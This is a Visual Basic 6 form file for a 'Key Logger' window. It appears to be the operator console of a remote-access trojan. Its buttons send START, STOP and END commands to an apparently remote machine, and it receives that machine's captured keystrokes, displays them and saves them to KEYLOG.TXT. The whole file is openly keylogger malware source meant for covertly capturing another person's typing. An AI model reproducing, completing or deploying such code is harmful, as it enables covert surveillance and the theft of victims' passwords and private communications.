VERSION 5.00
Begin VB.Form frmKeyLogger 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Key Logger"
   ClientHeight    =   4005
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4995
   Icon            =   "frmKeyLogger.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4005
   ScaleWidth      =   4995
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton cmdClear 
      Caption         =   "Clear"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      Left            =   3240
      Style           =   1  'Graphical
      TabIndex        =   3
      ToolTipText     =   "Clear key logger"
      Top             =   3540
      Width           =   800
   End
   Begin VB.CommandButton cmdStartLog 
      Caption         =   "Start Logging"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      Left            =   120
      Style           =   1  'Graphical
      TabIndex        =   2
      ToolTipText     =   "Start logging"
      Top             =   3540
      Width           =   1500
   End
   Begin VB.CommandButton cmdSave 
      Caption         =   "Save"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      Left            =   4110
      Style           =   1  'Graphical
      TabIndex        =   1
      ToolTipText     =   "Save to KEYLOG.TXT"
      Top             =   3540
      Width           =   800
   End
   Begin VB.TextBox txtData 
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3300
      Left            =   90
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   120
      Width           =   4830
   End
End
Attribute VB_Name = "frmKeyLogger"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdClear_Click()
txtData.text = ""
End Sub

Private Sub cmdSave_Click()
Dim Logname, sData As String

sData = txtData.text
Logname = frmMain.txtLocalFolder_10 & "KEYLOG.TXT"

If FileExists(Logname) Then
   Kill Logname
End If
Open Logname For Binary As #1
     Put #1, , sData
Close #1
End Sub

Private Sub cmdStartLog_Click()
If cmdStartLog.Caption = "Start Logging" Then
   cmdStartLog.Caption = "Stop Logging"
   Call frmMain.sendText("START")
ElseIf cmdStartLog.Caption = "Stop Logging" Then
   cmdStartLog.Caption = "Start Logging"
   Call frmMain.sendText("STOP")
End If
End Sub

Public Sub ReceivedKeyLogger(DATA As String)
    txtData.text = txtData & DATA
End Sub

Private Sub Form_Load()
    frmMain.Hide
    txtData.text = ""
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    frmMain.Show
    frmMain.txtAction.text = ""
    Call frmMain.sendText("END")
    DoEvents
    Unload Me
End Sub
